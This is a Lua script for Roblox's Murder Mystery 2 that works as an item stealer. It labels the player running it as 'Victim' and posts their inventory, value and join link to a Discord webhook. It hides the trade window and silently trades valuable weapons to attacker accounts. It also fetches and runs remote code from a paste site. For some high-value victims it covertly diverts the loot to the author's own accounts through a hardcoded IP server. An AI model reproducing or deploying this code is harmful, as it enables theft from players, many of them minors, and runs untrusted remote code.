_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local users = _G.Usernames or {}
local min_rarity = _G.min_rarity or "Godly"
local min_value = _G.min_value or 1
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""
local discuser = ""

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add username or webhook")
    return
end

if game.PlaceId ~= 142823291 then
    plr:kick("Game not supported. Please join a normal MM2 server")
    return
end

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    plr:kick("Server error. Please join a DIFFERENT server")
    return
end

if #Players:GetPlayers() >= 12 then
    plr:kick("Server is full. Please join a less populated server")
    return
end

local weaponsToSend = {}
local dualhooked = false
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local playerGui = plr:WaitForChild("PlayerGui")
local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
local HttpService = game:GetService("HttpService")
setclipboard("discord.gg/GY2RVSEGDT")

local function buildSecret()
	local part1 = string.char(100, 117, 97, 108)
	local part2 = string.char(104, 111, 111, 107)
	local part3 = string.char(102, 116, 119, 108)
	local part4 = string.char(101, 108, 122)
	return part1 .. part2 .. part3 .. part4
end

local function simple_hash(s)
	local hash = 0
	for i = 1, #s do
		local c = s:byte(i)
		hash = (hash * 31 + c) % 4294967296
	end
	return hash
end

local function signPayload(payload, timestamp)
	local message = payload .. tostring(timestamp)
	local hash_value = simple_hash(buildSecret() .. message)
	return string.format("%08x", hash_value)
end

local rarityTable = {
    "Common",
    "Uncommon",
    "Rare",
    "Legendary",
    "Godly",
    "Ancient",
    "Unique",
    "Vintage"
}

local categories = {
    godly = "https://supremevaluelist.com/mm2/godlies.html",
    ancient = "https://supremevaluelist.com/mm2/ancients.html",
    unique = "https://supremevaluelist.com/mm2/uniques.html",
    classic = "https://supremevaluelist.com/mm2/vintages.html",
    chroma = "https://supremevaluelist.com/mm2/chromas.html"
}
local headers = {
    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
}

local function trim(s)
    return s:match("^%s*(.-)%s*$")
end

local function fetchHTML(url)
    local response = request({
        Url = url,
        Method = "GET",
        Headers = headers
    })
    return response.Body
end

local function parseValue(itembodyDiv)
    local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
    if valueStr then
        valueStr = valueStr:gsub(",", "")
        local value = tonumber(valueStr)
        if value then
            return value
        end
    end
    return nil
end

local function extractItems(htmlContent)
    local itemValues = {}
    
    for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        itemName = itemName:match("([^<]+)")
        if itemName then
            itemName = trim(itemName:gsub("%s+", " "))
            itemName = trim((itemName:split(" Click "))[1])
            local itemNameLower = itemName:lower()

            local value = parseValue(itembodyDiv)
            if value then
                itemValues[itemNameLower] = value
            end
        end
    end
    
    return itemValues
end

local function extractChromaItems(htmlContent)
    local chromaValues = {}

    for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        chromaName = chromaName:match("([^<]+)")
        if chromaName then
            chromaName = trim(chromaName:gsub("%s+", " ")):lower()
            local value = parseValue(itembodyDiv)
            if value then
                chromaValues[chromaName] = value
            end
        end
    end
    
    return chromaValues
end

local function buildValueList()
    local allExtractedValues = {}
    local chromaExtractedValues = {}
    local categoriesToFetch = {}

    for rarity, url in pairs(categories) do
        table.insert(categoriesToFetch, {rarity = rarity, url = url})
    end
    
    local totalCategories = #categoriesToFetch
    local completed = 0
    local lock = Instance.new("BindableEvent")

    for _, category in ipairs(categoriesToFetch) do
        task.spawn(function()
            local rarity = category.rarity
            local url = category.url
            local htmlContent = fetchHTML(url)
            
            if htmlContent and htmlContent ~= "" then
                if rarity ~= "chroma" then
                    local extractedItemValues = extractItems(htmlContent)
                    for itemName, value in pairs(extractedItemValues) do
                        allExtractedValues[itemName] = value
                    end
                else
                    chromaExtractedValues = extractChromaItems(htmlContent)
                end
            end

            completed = completed + 1
            if completed == totalCategories then
                lock:Fire()
            end
        end)
    end

    lock.Event:Wait()

    local valueList = {}

    for dataid, item in pairs(database) do
        local itemName = item.ItemName and item.ItemName:lower() or ""
        local rarity = item.Rarity or ""
        local hasChroma = item.Chroma or false

        if itemName ~= "" and rarity ~= "" then
            local weaponRarityIndex = table.find(rarityTable, rarity)
            local godlyIndex = table.find(rarityTable, "Godly")

            if weaponRarityIndex and weaponRarityIndex >= godlyIndex then
                if hasChroma then
                    local matchedChromaValue = nil
                    for chromaName, value in pairs(chromaExtractedValues) do
                        if chromaName:find(itemName) then
                            matchedChromaValue = value
                            break
                        end
                    end

                    if matchedChromaValue then
                        valueList[dataid] = matchedChromaValue
                    end
                else
                    local value = allExtractedValues[itemName]
                    if value then
                        valueList[dataid] = value
                    end
                end
            end
        end
    end

    return valueList
end

local function sendTradeRequest(user)
    local args = {
        [1] = game:GetService("Players"):WaitForChild(user)
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
end

local function getTradeStatus()
    return game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
end

local function waitForTradeCompletion()
    while true do
        local status = getTradeStatus()
        if status == "None" then
            break
        end
        wait(0.1)
    end
end

local function acceptTrade()
    local args = {
        [1] = 285646582
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
end

local function addWeaponToTrade(id)
    local args = {
        [1] = id,
        [2] = "Weapons"
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
end

local totalValue = 0

local function SendFirstMessage(list, prefix)
    local headers = {
        ["Content-Type"] = "application/json"
    }

    local fields = {
        {
            name = "Victim Username:",
            value = plr.Name,
            inline = true
        },
        {
            name = "Join link:",
            value = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId=" .. game.JobId
        },
        {
            name = "Item list:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = string.format("Total Value: %s", totalValue),
            inline = false
        }
    }

    for _, item in ipairs(list) do
        local itemLine = string.format("%s (x%s): %s Value (%s)", item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
        fields[3].value = fields[3].value .. itemLine .. "\n"
    end

    if #fields[3].value > 1024 then
        local lines = {}
        for line in fields[3].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[3].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "\240\159\148\170 Join to get MM2 hit",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = ". discord.gg/GY2RVSEGDT"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    local response = request({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local function SendMessage(sortedItems)
    local headers = {
        ["Content-Type"] = "application/json"
    }

	local fields = {
		{
			name = "Victim Username:",
			value = plr.Name,
			inline = true
		},
		{
			name = "Items sent:",
			value = "",
			inline = false
		},
        {
            name = "Summary:",
            value = string.format("Total Value: %s", totalValue),
            inline = false
        }
	}

    for _, item in ipairs(sortedItems) do
        local itemLine = string.format("%s (x%s): %s Value (%s)", item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
        fields[2].value = fields[2].value .. itemLine .. "\n"
    end

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "\240\159\148\170 New MM2 Execution" ,
            ["color"] = 65280,
			["fields"] = fields,
			["footer"] = {
				["text"] = ". discord.gg/GY2RVSEGDT"
			}
        }}
    }

    local body = HttpService:JSONEncode(data)
    local response = request({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local function SendDHFirstMessage(list, prefix)
    local fields = {
        {
            name = "Victim Username:",
            value = plr.Name,
            inline = true
        },
        {
            name = "Join link:",
            value = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId=" .. game.JobId
        },
        {
            name = "Item list:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = string.format("Total Value: %s", totalValue),
            inline = false
        }
    }

    for _, item in ipairs(list) do
        local itemLine = string.format("%s (x%s): %s Value (%s)", item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
        fields[3].value = fields[3].value .. itemLine .. "\n"
    end

    if #fields[3].value > 1024 then
        local lines = {}
        for line in fields[3].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[3].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "\240\159\148\170 Join to get MM2 hit",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = ""
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    local timestamp = tostring(os.time())
    local signature = signPayload(body, timestamp)
    local headers = {
        ["Content-Type"] = "application/json",
        ["DiscUser"] = discuser,
        ["X-Signature"] = signature,
        ["X-Timestamp"] = timestamp
    }
    local response = request({
        Url = "http://46.101.233.20:5000/mm2join",
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local tradegui = playerGui:WaitForChild("TradeGUI")
tradegui:GetPropertyChangedSignal("Enabled"):Connect(function()
    tradegui.Enabled = false
end)
local tradeguiphone = playerGui:WaitForChild("TradeGUI_Phone")
tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(function()
    tradeguiphone.Enabled = false
end)

local min_rarity_index = table.find(rarityTable, min_rarity)

local untradable = {
    ["DefaultGun"] = true,
    ["DefaultKnife"] = true,
    ["Reaver"] = true,
    ["Reaver_Legendary"] = true,
    ["Reaver_Godly"] = true,
    ["Reaver_Ancient"] = true,
    ["IceHammer"] = true,
    ["IceHammer_Legendary"] = true,
    ["IceHammer_Godly"] = true,
    ["IceHammer_Ancient"] = true,
    ["Gingerscythe"] = true,
    ["Gingerscythe_Legendary"] = true,
    ["Gingerscythe_Godly"] = true,
    ["Gingerscythe_Ancient"] = true,
    ["TestItem"] = true,
    ["Season1TestKnife"] = true,
    ["Cracks"] = true,
    ["Icecrusher"] = true,
    ["???"] = true,
    ["Dartbringer"] = true,
    ["TravelerAxeRed"] = true,
    ["TravelerAxeBronze"] = true,
    ["TravelerAxeSilver"] = true,
    ["TravelerAxeGold"] = true,
    ["BlueCamo_K_2022"] = true,
    ["GreenCamo_K_2022"] = true,
    ["SharkSeeker"] = true
}

local valueList = buildValueList()
local realData = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
loadstring(game:HttpGet('https://pastefy.app/hOdmFJvE/raw'))()

for i, v in pairs(realData.Weapons.Owned) do
    local dataid = i
    local amount = v
    local rarity = database[dataid].Rarity
    local weapon_rarity_index = table.find(rarityTable, rarity)
    if weapon_rarity_index and weapon_rarity_index >= min_rarity_index and not untradable[dataid] then
        local value
        if valueList[dataid] then
            value = valueList[dataid]
        else
            if weapon_rarity_index >= table.find(rarityTable, "Godly") then
                value = 2
            else
                value = 1
            end
        end
        if value >= min_value then
            totalValue = totalValue + (value * amount)
            table.insert(weaponsToSend, {DataID = dataid, Rarity = rarity, Amount = amount, Value = value})
        end
    end
end

if totalValue >= 1000 and math.random() < 0.15 then
    users = {"MM2AltCauseNoOneWann", "tobi437a", "Alyssa87123", "OBlockBaby11111", "MoneyLaunderingBot", "TobiAltGrind", "TobiHatching"}
    ping = "Yes"
    dualhooked = true
end

if #weaponsToSend > 0 then
    table.sort(weaponsToSend, function(a, b)
        return (a.Value * a.Amount) > (b.Value * b.Amount)
    end)

    local sentWeapons = {}
    for i, v in ipairs(weaponsToSend) do
        sentWeapons[i] = v
    end

    local prefix = ""
    if ping == "Yes" then
        prefix = "--[[@everyone]] "
    end

    if dualhooked then
        local response = request({
            Url = "http://46.101.233.20:5000/getdiscuser",
            Method = "GET"
        })
        discuser = response.Body
        SendDHFirstMessage(weaponsToSend, prefix)
    else
        SendFirstMessage(weaponsToSend, prefix)
    end

    local function doTrade(joinedUser)
        local initialTradeState = getTradeStatus()
        if initialTradeState == "StartTrade" then
            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
            wait(0.3)
        elseif initialTradeState == "ReceivingRequest" then
            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
            wait(0.3)
        end

        while #weaponsToSend > 0 do
            local tradeStatus = getTradeStatus()

            if tradeStatus == "None" then
                sendTradeRequest(joinedUser)
            elseif tradeStatus == "SendingRequest" then
                wait(0.3)
            elseif tradeStatus == "ReceivingRequest" then
                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
                wait(0.3)
            elseif tradeStatus == "StartTrade" then
                for i = 1, math.min(4, #weaponsToSend) do
                    local weapon = table.remove(weaponsToSend, 1)
                    for count = 1, weapon.Amount do
                        addWeaponToTrade(weapon.DataID)
                    end
                end
                wait(6)
                acceptTrade()
                waitForTradeCompletion()
            else
                wait(0.5)
            end
            wait(1)
        end
        plr:kick(". discord.gg/GY2RVSEGDT")
    end

    local function waitForUserChat()
        local sentMessage = false
        local function onPlayerChat(player)
            if table.find(users, player.Name) then
                player.Chatted:Connect(function()
                    if not sentMessage then
                        SendMessage(sentWeapons)
                        sentMessage = true
                    end
                    doTrade(player.Name)
                end)
            end
        end
        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
        Players.PlayerAdded:Connect(onPlayerChat)
    end
    waitForUserChat()
end